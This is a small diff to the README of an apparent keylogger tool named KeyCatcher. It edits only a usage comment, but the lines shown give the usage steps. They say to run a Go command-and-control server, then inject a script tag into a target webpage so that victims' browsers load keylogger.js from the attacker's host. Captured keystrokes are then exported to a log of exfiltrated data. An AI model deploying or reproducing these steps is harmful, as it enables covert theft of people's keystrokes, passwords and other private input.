@@ -61,7 +61,7 @@ Open the keylogger.js file and modify the attackerServer variable to point to th
 # ▶️ Usage
 
 ```bash
-# 1. Start the KeyCatcher C2 Server:
+# 1. Start the KeyCatcher C2 Server Or you can download the executable and run it directly
   go run main.go
 # 2. Deploy the Payload:Inject the following script tag into the target webpage. The victim's browser will fetch and execute the payload from your C2 server.
   <script src="http://192.168.1.110:80/keylogger.js"></script>
@@ -72,6 +72,7 @@ Open the keylogger.js file and modify the attackerServer variable to point to th
     d. Press Ctrl+E to export all captured logs to exfiltrated_data.log.
     e. Press Ctrl+C to quit the application.
 ```
+
 
 ⚠️ Disclaimer
 
